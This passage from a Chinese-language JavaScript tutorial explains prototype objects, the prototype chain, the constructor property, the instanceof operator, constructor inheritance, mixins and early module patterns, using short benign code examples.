<p>上面代码中，函数f默认具有<code>prototype</code>属性，指向一个对象。<br>对于普通函数来说，该属性基本无用。但是，对于构造函数来说，生成实例的时候，该属性会自动成为实例对象的原型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Animal.prototype.color = <span class="string">&#x27;white&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> Animal(<span class="string">&#x27;大毛&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cat2 = <span class="keyword">new</span> Animal(<span class="string">&#x27;二毛&#x27;</span>);</span><br><span class="line"></span><br><span class="line">cat1.color <span class="comment">// &#x27;white&#x27;</span></span><br><span class="line">cat2.color <span class="comment">// &#x27;white&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，构造函数<code>Animal</code>的<code>prototype</code>属性，就是实例对象<code>cat1</code>和<code>cat2</code>的原型对象。原型对象上添加一个<code>color</code>属性，结果，实例对象都共享了该属性。<br>原型对象的属性不是实例对象自身的属性。只要修改原型对象，变动就立刻会体现在所有实例对象上。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Animal.prototype.color = <span class="string">&#x27;yellow&#x27;</span>;</span><br><span class="line"></span><br><span class="line">cat1.color <span class="comment">// &quot;yellow&quot;</span></span><br><span class="line">cat2.color <span class="comment">// &quot;yellow&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，原型对象的<code>color</code>属性的值变为<code>yellow</code>，两个实例对象的<code>color</code>属性立刻跟着变了。这是因为实例对象其实没有<code>color</code>属性，都是读取原型对象的<code>color</code>属性。也就是说，当实例对象本身没有某个属性或方法的时候，它会到原型对象去寻找该属性或方法。这就是原型对象的特殊之处。<br>如果实例对象自身就有某个属性或方法，它就不会再去原型对象寻找这个属性或方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cat1.color = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line"></span><br><span class="line">cat1.color <span class="comment">// &#x27;black&#x27;</span></span><br><span class="line">cat2.color <span class="comment">// &#x27;yellow&#x27;</span></span><br><span class="line">Animal.prototype.color <span class="comment">// &#x27;yellow&#x27;;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，实例对象<code>cat1</code>的<code>color</code>属性改为<code>black</code>，就使得它不再去原型对象读取<code>color</code>属性，后者的值依然为<code>yellow</code>。<br>总结一下，原型对象的作用，就是定义所有实例对象共享的属性和方法。这也是它被称为原型对象的原因，而实例对象可以视作从原型对象衍生出来的子对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Animal.prototype.walk = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">this</span>.name + <span class="string">&#x27; is walking&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Animal.prototype</code>对象上面定义了一个<code>walk</code>方法，这个方法将可以在所有<code>Animal</code>实例对象上面调用。</p>
<h5 id="3-1-3-原型链"><a href="#3-1-3-原型链" class="headerlink" title="3.1.3 原型链"></a>3.1.3 原型链</h5><p>JavaScript 规定，所有对象都有自己的原型对象（prototype）。一方面，任何一个对象，都可以充当其他对象的原型；另一方面，由于原型对象也是对象，所以它也有自己的原型。因此，就会形成一个“原型链”（prototype chain）：对象到原型，再到原型的原型……</p>
<p>如果一层层地上溯，所有对象的原型最终都可以上溯到<code>Object.prototype</code>，即<code>Object</code>构造函数的<code>prototype</code>属性。也就是说，所有对象都继承了<code>Object.prototype</code>的属性。这就是所有对象都有<code>valueOf</code>和<code>toString</code>方法的原因，因为这是从<code>Object.prototype</code>继承的。</p>
<p>那么，<code>Object.prototype</code>对象有没有它的原型呢？回答是<code>Object.prototype</code>的原型是<code>null</code>。<code>null</code>没有任何属性和方法，也没有自己的原型。因此，原型链的尽头就是<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getPrototypeOf(<span class="built_in">Object</span>.prototype)</span><br><span class="line"><span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，<code>Object.prototype</code>对象的原型是<code>null</code>，由于<code>null</code>没有任何属性，所以原型链到此为止。<code>Object.getPrototypeOf</code>方法返回参数对象的原型，具体介绍请看后文</p>
<p>读取对象的某个属性时，JavaScript 引擎先寻找对象本身的属性，如果找不到，就到它的原型去找，如果还是找不到，就到原型的原型去找。如果直到最顶层的<code>Object.prototype</code>还是找不到，则返回<code>undefined</code>。如果对象自身和它的原型，都定义了一个同名属性，那么优先读取对象自身的属性，这叫做“覆盖”（overriding）。</p>
<p>注意，一级级向上，在整个原型链上寻找某个属性，对性能是有影响的。所寻找的属性在越上层的原型对象，对性能的影响越大。如果寻找某个不存在的属性，将会遍历整个原型链。</p>
<p>举例来说，如果让构造函数的<code>prototype</code>属性指向一个数组，就意味着实例对象可以调用数组方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> MyArray = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">MyArray.prototype = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">MyArray.prototype.constructor = MyArray;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mine = <span class="keyword">new</span> MyArray();</span><br><span class="line">mine.push(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">mine.length <span class="comment">// 3</span></span><br><span class="line">mine <span class="keyword">instanceof</span> <span class="built_in">Array</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>mine</code>是构造函数<code>MyArray</code>的实例对象，由于<code>MyArray.prototype</code>指向一个数组实例，使得<code>mine</code>可以调用数组方法（这些方法定义在数组实例的<code>prototype</code>对象上面）。最后那行<code>instanceof</code>表达式，用来比较一个对象是否为某个构造函数的实例，结果就是证明<code>mine</code>为<code>Array</code>的实例，<code>instanceof</code>运算符的详细解释详见后文。</p>
<p>上面代码还出现了原型对象的<code>constructor</code>属性，这个属性的含义下一节就来解释。</p>
<h5 id="3-1-4-constructor-属性"><a href="#3-1-4-constructor-属性" class="headerlink" title="3.1.4 constructor 属性"></a>3.1.4 constructor 属性</h5><p><code>prototype</code>对象有一个<code>constructor</code>属性，默认指向<code>prototype</code>对象所在的构造函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">P</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">P.prototype.constructor === P <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>由于<code>constructor</code>属性定义在<code>prototype</code>对象上面，意味着可以被所有实例对象继承。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">P</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> P();</span><br><span class="line"></span><br><span class="line">p.constructor === P <span class="comment">// true</span></span><br><span class="line">p.constructor === P.prototype.constructor <span class="comment">// true</span></span><br><span class="line">p.hasOwnProperty(<span class="string">&#x27;constructor&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>p</code>是构造函数<code>P</code>的实例对象，但是<code>p</code>自身没有<code>constructor</code>属性，该属性其实是读取原型链上面的<code>P.prototype.constructor</code>属性。<br><code>constructor</code>属性的作用是，可以得知某个实例对象，到底是哪一个构造函数产生的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> F();</span><br><span class="line"></span><br><span class="line">f.constructor === F <span class="comment">// true</span></span><br><span class="line">f.constructor === <span class="built_in">RegExp</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>constructor</code>属性确定了实例对象<code>f</code>的构造函数是<code>F</code>，而不是<code>RegExp</code>。<br>另一方面，有了<code>constructor</code>属性，就可以从一个实例对象新建另一个实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Constr</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> Constr();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> y = <span class="keyword">new</span> x.constructor();</span><br><span class="line">y <span class="keyword">instanceof</span> Constr <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>x</code>是构造函数<code>Constr</code>的实例，可以从<code>x.constructor</code>间接调用构造函数。这使得在实例方法中，调用自身的构造函数成为可能</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Constr.prototype.createCopy = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">this</span>.constructor();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>createCopy</code>方法调用构造函数，新建另一个实例。<br><code>constructor</code>属性表示原型对象与构造函数之间的关联关系，如果修改了原型对象，一般会同时修改<code>constructor</code>属性，防止引用的时候出错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.constructor === Person <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  method: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Person.prototype.constructor === Person <span class="comment">// false</span></span><br><span class="line">Person.prototype.constructor === <span class="built_in">Object</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，构造函数<code>Person</code>的原型对象改掉了，但是没有修改<code>constructor</code>属性，导致这个属性不再指向<code>Person</code>。由于<code>Person</code>的新原型是一个普通对象，而普通对象的<code>constructor</code>属性指向<code>Object</code>构造函数，导致<code>Person.prototype.constructor</code>变成了<code>Object</code>。<br>所以，修改原型对象时，一般要同时修改<code>constructor</code>属性的指向。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 坏的写法</span></span><br><span class="line">C.prototype = &#123;</span><br><span class="line">  method1: <span class="function"><span class="keyword">function</span> (<span class="params">...</span>) </span>&#123; ... &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 好的写法</span></span><br><span class="line">C.prototype = &#123;</span><br><span class="line">  <span class="title">constructor</span>: <span class="title">C</span>,</span><br><span class="line">  <span class="title">method1</span>: <span class="title">function</span> (<span class="params">...</span>) &#123; ... &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更好的写法</span></span><br><span class="line">C.prototype.method1 = <span class="function"><span class="keyword">function</span> (<span class="params">...</span>) </span>&#123; ... &#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码中，要么将<code>constructor</code>属性重新指向原来的构造函数，要么只在原型对象上添加方法，这样可以保证<code>instanceof</code>运算符不会失真。<br>如果不能确定<code>constructor</code>属性是什么函数，还有一个办法：通过<code>name</code>属性，从实例得到构造函数的名称。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> Foo();</span><br><span class="line">f.constructor.name <span class="comment">// &quot;Foo&quot;</span></span><br></pre></td></tr></table></figure>


<h4 id="3-2-instanceof-运算符"><a href="#3-2-instanceof-运算符" class="headerlink" title="3.2 instanceof 运算符"></a>3.2 instanceof 运算符</h4><p><code>instanceof</code>运算符返回一个布尔值，表示对象是否为某个构造函数的实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> v = <span class="keyword">new</span> Vehicle();</span><br><span class="line">v <span class="keyword">instanceof</span> Vehicle <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，对象v是构造函数<code>Vehicle</code>的实例，所以返回<code>true</code>。<br><code>instanceof</code>运算符的左边是实例对象，右边是构造函数。它会检查右边构造函数的原型对象（prototype），是否在左边对象的原型链上。因此，下面两种写法是等价的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">v <span class="keyword">instanceof</span> Vehicle</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">Vehicle.prototype.isPrototypeOf(v)</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Vehicle</code>是对象<code>v</code>的构造函数，它的原型对象是<code>Vehicle.prototype</code>，<code>isPrototypeOf()</code>方法是 JavaScript 提供的原生方法，用于检查某个对象是否为另一个对象的原型，详细解释见后文。<br>由于<code>instanceof</code>检查整个原型链，因此同一个实例对象，可能会对多个构造函数都返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">d <span class="keyword">instanceof</span> <span class="built_in">Date</span> <span class="comment">// true</span></span><br><span class="line">d <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>d</code>同时是<code>Date</code>和<code>Object</code>的实例，因此对这两个构造函数都返回<code>true</code>。<br>由于任意对象（除了<code>null</code>）都是<code>Object</code>的实例，所以<code>instanceof</code>运算符可以判断一个值是否为非<code>null</code>的对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">foo</span>: <span class="number">123</span> &#125;;</span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，除了<code>null</code>，其他对象的<code>instanceOf Object</code>的运算结果都是<code>true</code>。<br><code>instanceof</code>的原理是检查右边构造函数的<code>prototype</code>属性，是否在左边对象的原型链上。有一种特殊情况，就是左边对象的原型链上，只有<code>null</code>对象。这时，<code>instanceof</code>判断会失真。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">typeof</span> obj <span class="comment">// &quot;object&quot;</span></span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Object.create(null)</code>返回一个新对象<code>obj</code>，它的原型是<code>null</code>（<code>Object.create()</code>的详细介绍见后文）。右边的构造函数<code>Object</code>的<code>prototype</code>属性，不在左边的原型链上，因此<code>instanceof</code>就认为<code>obj</code>不是<code>Object</code>的实例。这是唯一的<code>instanceof</code>运算符判断会失真的情况（一个对象的原型是<code>null</code>）。<br><code>instanceof</code>运算符的一个用处，是判断值的类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> y = &#123;&#125;;</span><br><span class="line">x <span class="keyword">instanceof</span> <span class="built_in">Array</span> <span class="comment">// true</span></span><br><span class="line">y <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>instanceof</code>运算符判断，变量<code>x</code>是数组，变量<code>y</code>是对象。</p>
<p>注意，<code>instanceof</code>运算符只能用于对象，不适用原始类型的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">s <span class="keyword">instanceof</span> <span class="built_in">String</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，字符串不是<code>String</code>对象的实例（因为字符串不是对象），所以返回<code>false</code>。<br>此外，对于<code>undefined</code>和<code>null</code>，<code>instanceof</code>运算符总是返回<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="literal">undefined</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>利用<code>instanceof</code>运算符，还可以巧妙地解决，调用构造函数时，忘了加<code>new</code>命令的问题</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Fubar</span> (<span class="params">foo, bar</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span> <span class="keyword">instanceof</span> Fubar) &#123;</span><br><span class="line">    <span class="built_in">this</span>._foo = foo;</span><br><span class="line">    <span class="built_in">this</span>._bar = bar;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Fubar(foo, bar);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码使用<code>instanceof</code>运算符，在函数体内部判断<code>this</code>关键字是否为构造函数<code>Fubar</code>的实例。如果不是，就表明忘了加<code>new</code>命令</p>
<h4 id="3-3-构造函数的继承"><a href="#3-3-构造函数的继承" class="headerlink" title="3.3 构造函数的继承"></a>3.3 构造函数的继承</h4><p>让一个构造函数继承另一个构造函数，是非常常见的需求。这可以分成两步实现。第一步是在子类的构造函数中，调用父类的构造函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  Super.call(<span class="built_in">this</span>);</span><br><span class="line">  <span class="built_in">this</span>.prop = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Sub</code>是子类的构造函数，<code>this</code>是子类的实例。在实例上调用父类的构造函数<code>Super</code>，就会让子类实例具有父类实例的属性。<br>第二步，是让子类的原型指向父类的原型，这样子类就可以继承父类原型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Sub.prototype = <span class="built_in">Object</span>.create(Super.prototype);</span><br><span class="line">Sub.prototype.constructor = Sub;</span><br><span class="line">Sub.prototype.method = <span class="string">&#x27;...&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Sub.prototype</code>是子类的原型，要将它赋值为<code>Object.create(Super.prototype)</code>，而不是直接等于<code>Super.prototype</code>。否则后面两行对<code>Sub.prototype</code>的操作，会连父类的原型<code>Super.prototype</code>一起修改掉。<br>另外一种写法是<code>Sub.prototype</code>等于一个父类实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Sub.prototype = <span class="keyword">new</span> Super();</span><br></pre></td></tr></table></figure>
<p>上面这种写法也有继承的效果，但是子类会具有父类实例的方法。有时，这可能不是我们需要的，所以不推荐使用这种写法。<br>举例来说，下面是一个<code>Shape</code>构造函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Shape</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.x = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">this</span>.y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Shape.prototype.move = <span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.x += x;</span><br><span class="line">  <span class="built_in">this</span>.y += y;</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">&#x27;Shape moved.&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们需要让<code>Rectangle</code>构造函数继承<code>Shape</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一步，子类继承父类的实例</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rectangle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  Shape.call(<span class="built_in">this</span>); <span class="comment">// 调用父类构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 另一种写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rectangle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.base = Shape;</span><br><span class="line">  <span class="built_in">this</span>.base();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二步，子类继承父类的原型</span></span><br><span class="line">Rectangle.prototype = <span class="built_in">Object</span>.create(Shape.prototype);</span><br><span class="line">Rectangle.prototype.constructor = Rectangle;</span><br></pre></td></tr></table></figure>
<p>采用这样的写法以后，<code>instanceof</code>运算符会对子类和父类的构造函数，都返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rect = <span class="keyword">new</span> Rectangle();</span><br><span class="line"></span><br><span class="line">rect <span class="keyword">instanceof</span> Rectangle  <span class="comment">// true</span></span><br><span class="line">rect <span class="keyword">instanceof</span> Shape  <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，子类是整体继承父类。有时只需要单个方法的继承，这时可以采用下面的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ClassB.prototype.print = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  ClassA.prototype.print.call(<span class="built_in">this</span>);</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，子类<code>B</code>的<code>print</code>方法先调用父类<code>A</code>的<code>print</code>方法，再部署自己的代码。这就等于继承了父类<code>A</code>的<code>print</code>方法。</p>
<h4 id="3-4-多重继承"><a href="#3-4-多重继承" class="headerlink" title="3.4 多重继承"></a>3.4 多重继承</h4><p>JavaScript 不提供多重继承功能，即不允许一个对象同时继承多个对象。但是，可以通过变通方法，实现这个功能。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">M1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.hello = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">M2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.world = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">S</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  M1.call(<span class="built_in">this</span>);</span><br><span class="line">  M2.call(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承 M1</span></span><br><span class="line">S.prototype = <span class="built_in">Object</span>.create(M1.prototype);</span><br><span class="line"><span class="comment">// 继承链上加入 M2</span></span><br><span class="line"><span class="built_in">Object</span>.assign(S.prototype, M2.prototype);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定构造函数</span></span><br><span class="line">S.prototype.constructor = S;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> S();</span><br><span class="line">s.hello <span class="comment">// &#x27;hello&#x27;</span></span><br><span class="line">s.world <span class="comment">// &#x27;world&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，子类<code>S</code>同时继承了父类<code>M1</code>和<code>M2</code>。这种模式又称为 Mixin（混入）。</p>
<h4 id="3-5-模块"><a href="#3-5-模块" class="headerlink" title="3.5 模块"></a>3.5 模块</h4><p>随着网站逐渐变成“互联网应用程序”，嵌入网页的 JavaScript 代码越来越庞大，越来越复杂。网页越来越像桌面程序，需要一个团队分工协作、进度管理、单元测试等等……开发者必须使用软件工程的方法，管理网页的业务逻辑。</p>
<p>JavaScript 模块化编程，已经成为一个迫切的需求。理想情况下，开发者只需要实现核心的业务逻辑，其他都可以加载别人已经写好的模块。</p>
<p>但是，JavaScript 不是一种模块化编程语言，ES6 才开始支持“类”和“模块”。下面介绍传统的做法，如何利用对象实现模块的效果。</p>
<h5 id="3-5-1-基本的实现方法"><a href="#3-5-1-基本的实现方法" class="headerlink" title="3.5.1 基本的实现方法"></a>3.5.1 基本的实现方法</h5><p>模块是实现特定功能的一组属性和方法的封装。<br>简单的做法是把模块写成一个对象，所有的模块成员都放到这个对象里面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;</span><br><span class="line">　_count : <span class="number">0</span>,</span><br><span class="line">　m1 : <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">　　<span class="comment">//...</span></span><br><span class="line">　&#125;,</span><br><span class="line">　m2 : <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  　<span class="comment">//...</span></span><br><span class="line">　&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面的函数<code>m1</code>和<code>m2</code>，都封装在<code>module1</code>对象里。使用的时候，就是调用这个对象的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">module1.m1();</span><br></pre></td></tr></table></figure>
<p>但是，这样的写法会暴露所有模块成员，内部状态可以被外部改写。比如，外部代码可以直接改变内部计数器的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">module1._count = <span class="number">5</span>;</span><br></pre></td></tr></table></figure>
<h5 id="3-5-2-封装私有变量：构造函数的写法"><a href="#3-5-2-封装私有变量：构造函数的写法" class="headerlink" title="3.5.2 封装私有变量：构造函数的写法"></a>3.5.2 封装私有变量：构造函数的写法</h5><p>我们可以利用构造函数，封装私有变量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StringBuilder</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> buffer = [];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.add = <span class="function"><span class="keyword">function</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">     buffer.push(str);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.toString = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> buffer.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>buffer</code>是模块的私有变量。一旦生成实例对象，外部是无法直接访问<code>buffer</code>的。但是，这种方法将私有变量封装在构造函数中，导致构造函数与实例对象是一体的，总是存在于内存之中，无法在使用完成后清除。这意味着，构造函数有双重作用，既用来塑造实例对象，又用来保存实例对象的数据，违背了构造函数与实例对象在数据上相分离的原则（即实例对象的数据，不应该保存在实例对象以外）。同时，非常耗费内存。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StringBuilder</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>._buffer = [];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">StringBuilder.prototype = &#123;</span><br><span class="line">  <span class="title">constructor</span>: <span class="title">StringBuilder</span>,</span><br><span class="line">  <span class="title">add</span>: <span class="title">function</span> (<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="built_in">this</span>._buffer.push(str);</span><br><span class="line">  &#125;,</span><br><span class="line">  toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._buffer.join(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这种方法将私有变量放入实例对象中，好处是看上去更自然，但是它的私有变量可以从外部读写，不是很安全。</p>
<h5 id="3-5-3-封装私有变量：立即执行函数的写法"><a href="#3-5-3-封装私有变量：立即执行函数的写法" class="headerlink" title="3.5.3 封装私有变量：立即执行函数的写法"></a>3.5.3 封装私有变量：立即执行函数的写法</h5><p>另一种做法是使用“立即执行函数”（Immediately-Invoked Function Expression，IIFE），将相关的属性和方法封装在一个函数作用域里面，可以达到不暴露私有成员的目的。</p>
